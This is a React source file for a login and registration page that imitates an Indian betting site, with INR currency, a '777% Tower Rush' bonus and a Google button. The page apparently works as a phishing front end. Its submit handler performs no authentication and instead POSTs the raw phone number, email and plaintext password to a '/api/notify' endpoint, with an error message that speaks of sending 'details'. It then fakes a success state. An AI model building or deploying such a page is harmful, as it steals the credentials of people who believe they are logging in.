/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, MessagesSquare, Mail, Phone, Eye, EyeOff, Check, Plus, ChevronRight, Search, Loader2 } from 'lucide-react';

type AuthView = 'login' | 'register';
type AuthTab = 'email' | 'phone';

const COLORS = {
  bg: '#0a1622',
  card: '#111e2d',
  inputBg: '#1a2737',
  accent: '#007bff',
  textMuted: '#8a9ab0',
  textLight: '#ffffff',
  textAccent: '#3b82f6',
};

export default function App() {
  const [view, setView] = useState<AuthView>('login');
  const [tab, setTab] = useState<AuthTab>('phone');
  const [showPassword, setShowPassword] = useState(false);
  const [isAgreed, setIsAgreed] = useState(true);

  // Form states
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const isLoginFormValid = (tab === 'phone' ? phone.length > 0 : email.length > 0) && password.length > 0;
  const isRegisterFormValid = phone.length > 0 && password.length > 0 && isAgreed;

  const handleAction = async () => {
    if (isLoading || isSuccess) return;

    if ((view === 'login' && isLoginFormValid) || (view === 'register' && isRegisterFormValid)) {
      setIsLoading(true);
      
      // Artificial delay of 1 second as requested
      await new Promise(resolve => setTimeout(resolve, 1000));

      try {
        const response = await fetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: view,
            data: view === 'login' ? { tab, phone, email, password } : { phone, password }
          })
        });
        
        setIsLoading(false);

        if (response.ok) {
          setIsSuccess(true);
          // Reset success state after a few seconds
          setTimeout(() => setIsSuccess(false), 3000);
        } else {
          const err = await response.json();
          console.error('Server error:', err);
          alert('Failed to send details. Error: ' + (err.error || 'Unknown'));
        }
      } catch (error) {
        console.error('Notification failed:', error);
        setIsLoading(false);
        alert('Network error. Please try again.');
      }
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 font-sans selection:bg-blue-500/30" style={{ backgroundColor: COLORS.bg }}>
      <main className="w-full max-w-[450px] relative">
        <AnimatePresence mode="wait">
          <motion.div
            key={view}
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ duration: 0.2 }}
            className="rounded-xl shadow-2xl overflow-hidden border border-white/5"
            style={{ backgroundColor: COLORS.card }}
          >
            {/* Header */}
            <div className="flex items-center justify-between p-4 border-b border-white/10">
              <div className="flex items-center gap-2">
                <MessagesSquare className="w-6 h-6 text-white" />
              </div>
              <h1 className="text-white font-bold text-lg tracking-wider uppercase ml-4">
                {view === 'login' ? 'LOG IN' : 'REGISTRATION'}
              </h1>
              <button className="text-white/60 hover:text-white transition-colors cursor-pointer">
                <X className="w-6 h-6" />
              </button>
            </div>

            <div className="p-6 pt-4">
              {/* Toggle View Link */}
              <p className="text-white/80 text-sm mb-6">
                {view === 'login' ? (
                  <>
                    <span className="opacity-60">New user?</span>{' '}
                    <button onClick={() => setView('register')} className="text-blue-500 font-bold hover:text-blue-400 transition-colors cursor-pointer">
                      Registration
                    </button>
                  </>
                ) : (
                  <>
                    <span className="opacity-60">Have an account?</span>{' '}
                    <button onClick={() => setView('login')} className="text-blue-500 font-bold hover:text-blue-400 transition-colors cursor-pointer">
                      Log In
                    </button>
                  </>
                )}
              </p>

              {/* Login Tabs */}
              {view === 'login' && (
                <div className="grid grid-cols-2 gap-3 mb-6">
                  <button
                    onClick={() => setTab('email')}
                    className={`flex items-center justify-center gap-2 py-3.5 rounded-lg font-bold transition-all duration-300 transform active:scale-95 cursor-pointer ${
                      tab === 'email' 
                        ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/30' 
                        : 'bg-[#1a2737] text-white/40 hover:bg-[#222f3f]'
                    }`}
                  >
                    <Mail className={`w-5 h-5 transition-transform ${tab === 'email' ? 'scale-110' : ''}`} />
                    <span className="text-[15px]">Email or ID</span>
                  </button>
                  <button
                    onClick={() => setTab('phone')}
                    className={`flex items-center justify-center gap-2 py-3.5 rounded-lg font-bold transition-all duration-300 transform active:scale-95 cursor-pointer ${
                      tab === 'phone' 
                        ? 'bg-blue-600 text-white shadow-lg shadow-blue-600/30' 
                        : 'bg-[#1a2737] text-white/40 hover:bg-[#222f3f]'
                    }`}
                  >
                    <Phone className={`w-5 h-5 transition-transform ${tab === 'phone' ? 'scale-110' : ''}`} />
                    <span className="text-[15px]">Phone</span>
                  </button>
                </div>
              )}

              {/* Inputs */}
              <div className="space-y-4">
                {/* Phone Input */}
                {(tab === 'phone' || view === 'register') && (
                  <div className="relative group">
                    <div className={`flex h-[58px] rounded-lg overflow-hidden border transition-all duration-300 ${
                      phone ? 'border-blue-500 bg-[#1a2a3a] shadow-[0_0_20px_rgba(59,130,246,0.15)]' : 'border-white/10 bg-[#1a2737]'
                    } focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500/20`}>
                      <div className="flex items-center gap-2 px-4 border-r border-white/10 text-white cursor-pointer hover:bg-white/5 transition-colors">
                        <img 
                          src="https://flagcdn.com/w20/in.png" 
                          alt="India" 
                          className="w-5 h-3.5 object-cover rounded-sm border border-white/20"
                        />
                        <span className="text-[15px] font-bold">+91</span>
                        <ChevronRight className="w-4 h-4 text-white/40 rotate-90" />
                      </div>
                      <input
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                        placeholder="Phone number"
                        className="flex-1 bg-transparent px-4 text-white text-[15px] font-medium placeholder:text-white/20 focus:outline-none"
                      />
                    </div>
                  </div>
                )}

                {/* Email Input */}
                {view === 'login' && tab === 'email' && (
                  <div className="relative group">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Email or ID"
                      className={`w-full h-[58px] rounded-lg px-4 text-white text-[15px] font-medium border transition-all duration-300 focus:outline-none ${
                        email ? 'border-blue-500 bg-[#1a2a3a] shadow-[0_0_20px_rgba(59,130,246,0.15)]' : 'border-white/10 bg-[#1a2737]'
                      } focus:border-blue-500 focus:ring-1 focus:ring-blue-500/20 placeholder:text-white/20`}
                    />
                  </div>
                )}

                {/* Password Input */}
                <div className="relative group">
                  <div className={`flex items-center h-[58px] rounded-lg border transition-all duration-300 ${
                    password ? 'border-blue-500 bg-[#1a2a3a] shadow-[0_0_20px_rgba(59,130,246,0.15)]' : 'border-white/10 bg-[#1a2737]'
                  } focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500/20`}>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="flex-1 bg-transparent px-4 text-white text-[15px] font-medium placeholder:text-white/20 focus:outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className={`px-4 transition-colors cursor-pointer ${showPassword ? 'text-blue-500' : 'text-white/30 hover:text-white/60'}`}
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                </div>

                {/* Registration Specific Fields */}
                {view === 'register' && (
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="space-y-4"
                  >
                    <div className="flex items-center justify-between h-[58px] rounded-lg bg-[#1a2737] border border-white/10 px-4 cursor-pointer hover:bg-[#212e3f] transition-all hover:border-white/20">
                      <div className="flex items-center gap-3">
                        <img 
                          src="https://flagcdn.com/w20/in.png" 
                          alt="India" 
                          className="w-5 h-3.5 object-cover rounded-sm border border-white/20"
                        />
                        <span className="text-white font-bold text-[15px]">₹ — INR</span>
                      </div>
                      <ChevronRight className="w-5 h-5 text-white/40 rotate-90" />
                    </div>

                    <button className="flex items-center gap-2 text-blue-500 font-bold text-[13px] py-1 hover:text-blue-400 transition-colors cursor-pointer group">
                      <Plus className="w-4 h-4 border border-blue-500 rounded-full group-hover:bg-blue-500/10 transition-colors" />
                      I have a promo code
                    </button>

                    <div className="mt-8">
                      <h3 className="text-white font-black text-[13px] tracking-tight mb-4 uppercase opacity-80">CHOOSE YOUR BONUS</h3>
                      <button className="w-full relative group cursor-pointer overflow-hidden rounded-xl h-[72px] transition-transform active:scale-[0.98]">
                        <div className="absolute inset-0 bg-blue-600" />
                        <div className="relative flex items-center gap-4 px-4 h-full">
                          <div className="w-12 h-12 rounded-full overflow-hidden flex-shrink-0 border-2 border-white/30 shadow-lg">
                            <img src="https://images.unsplash.com/photo-1511512578047-dfb367046420?w=120" alt="Bonus" className="w-full h-full object-cover" />
                          </div>
                          <div className="flex-1 text-left">
                            <p className="font-extrabold text-white text-[14px] leading-tight group-hover:translate-x-0.5 transition-transform">777% Tower Rush Welcome Pack</p>
                            <p className="text-[12px] text-white/80 font-medium">Climb the Tower with Boost</p>
                          </div>
                          <ChevronRight className="w-5 h-5 text-white/50 group-hover:translate-x-1 transition-transform" />
                        </div>
                      </button>
                    </div>

                    <label className="flex gap-4 items-start cursor-pointer group mt-6 select-none bg-white/5 p-3 rounded-lg border border-white/5">
                      <div className="relative pt-0.5">
                        <input 
                          type="checkbox" 
                          checked={isAgreed} 
                          onChange={(e) => setIsAgreed(e.target.checked)} 
                          className="sr-only" 
                        />
                        <div className={`w-6 h-6 rounded flex items-center justify-center transition-all duration-300 border-2 ${
                          isAgreed 
                            ? 'bg-emerald-500 border-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.3)]' 
                            : 'border-white/20 hover:border-white/40'
                        }`}>
                          {isAgreed && <Check className="w-4 h-4 text-white stroke-[3.5]" />}
                        </div>
                      </div>
                      <span className="text-[12px] text-white/70 leading-normal font-medium">
                        I confirm all the <span className="text-white font-bold decoration-white/30 decoration-1 underline-offset-2">Terms of user agreement</span> and that I am over 18
                      </span>
                    </label>
                  </motion.div>
                )}
              </div>

              {/* Forgot Password Link (Login Only) */}
              {view === 'login' && (
                <div className="flex justify-start mt-4">
                  <button className="text-[13px] group transition-colors cursor-pointer">
                    <span className="text-white/40 group-hover:text-white/60 transition-colors">Forgot password? </span>
                    <span className="text-blue-500 font-bold hover:text-blue-400">Reset</span>
                  </button>
                </div>
              )}

              {/* Action Button */}
              <button 
                onClick={handleAction}
                disabled={(view === 'login' ? !isLoginFormValid : !isRegisterFormValid) || isLoading || isSuccess}
                className={`w-full py-4.5 mt-10 rounded-xl font-black text-[15px] uppercase tracking-widest transition-all duration-500 transform active:scale-[0.97] cursor-pointer relative overflow-hidden flex items-center justify-center ${
                  isSuccess 
                    ? 'bg-emerald-500 text-white shadow-xl shadow-emerald-500/40'
                    : (view === 'login' ? isLoginFormValid : isRegisterFormValid)
                      ? 'bg-blue-600 text-white shadow-xl shadow-blue-600/40 opacity-100 hover:bg-blue-500' 
                      : 'bg-[#1a2737] text-white/20 opacity-100 cursor-not-allowed'
                }`}
              >
                {isLoading ? (
                  <div className="flex items-center gap-3">
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>PROCESSING...</span>
                  </div>
                ) : isSuccess ? (
                  <div className="flex items-center gap-2">
                    <Check className="w-6 h-6" />
                    <span>SUCCESS</span>
                  </div>
                ) : (
                  view === 'login' ? 'LOG IN' : 'REGISTRATION'
                )}
              </button>

              {/* Separator */}
              <div className="relative my-10 px-4">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-white/10"></div>
                </div>
                <div className="relative flex justify-center">
                  <span className="bg-[#111e2d] px-4 text-white font-black text-[11px] tracking-[0.2em] opacity-40">OR</span>
                </div>
              </div>

              {/* Google Button */}
              <button className="w-full h-[58px] rounded-full bg-[#3b82f6] hover:bg-blue-600 transition-all duration-300 flex items-center p-1 group cursor-pointer shadow-lg active:scale-[0.98]">
                <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center p-2.5 shadow-md flex-shrink-0 group-hover:scale-95 transition-transform">
                  <svg className="w-full h-full" viewBox="0 0 24 24">
                    <path
                      fill="#4285F4"
                      d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                    />
                    <path
                      fill="#34A853"
                      d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                    />
                    <path
                      fill="#FBBC05"
                      d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
                    />
                    <path
                      fill="#EA4335"
                      d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                    />
                  </svg>
                </div>
                <span className="flex-1 text-center font-black text-white text-[15px] pr-8 tracking-wide">Continue with Google</span>
              </button>
            </div>
          </motion.div>
        </AnimatePresence>
      </main>
    </div>
  );
}
